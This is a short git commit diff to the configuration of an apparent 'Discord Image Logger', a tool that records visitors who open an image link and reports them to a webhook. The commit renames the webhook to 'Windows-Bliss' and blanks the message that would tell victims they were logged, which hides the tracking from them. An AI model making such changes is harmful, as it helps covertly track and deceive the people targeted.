e4b6a5b0133bbf6860824717e987b5a3033a509f
CRYPTIC3RR0R <167587565+CRYPTIC3RR0R@users.noreply.github.com>
2026-02-23 19:56:23 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -20,7 +20,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Windows-Bliss", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -30,7 +30,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
